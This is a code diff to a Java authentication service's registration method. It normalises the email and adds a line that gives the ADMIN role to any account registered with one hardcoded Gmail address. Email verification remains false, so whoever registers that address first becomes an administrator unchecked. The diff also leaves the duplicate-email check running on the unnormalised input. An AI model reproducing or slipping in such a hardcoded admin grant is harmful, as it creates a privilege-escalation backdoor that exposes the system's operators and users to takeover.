@@ -52,13 +52,14 @@ public class AuthService {
             throw new DuplicateEmailException(request.getEmail());
         }
 
+        String email = request.getEmail().trim().toLowerCase();
         User user = new User(
                 request.getName(),
-                request.getEmail(),
+            email,
                 passwordEncoder.encode(request.getPassword())
         );
 
-        user.setRole(Role.EMPLOYEE);
+        user.setRole("jamhab35@gmail.com".equals(email) ? Role.ADMIN : Role.EMPLOYEE);
         user.setEmailVerified(false);
 
         User saved = userRepository.save(user);
